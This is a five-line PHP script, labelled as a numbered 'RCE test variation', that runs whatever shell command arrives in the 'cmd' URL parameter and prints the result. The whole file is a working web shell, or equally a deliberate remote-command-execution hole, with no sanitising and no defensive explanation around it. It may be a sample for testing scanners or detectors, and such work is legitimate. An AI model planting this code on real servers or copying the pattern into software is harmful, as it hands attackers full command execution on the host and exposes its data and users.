<?php
// RCE test variation #1221
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>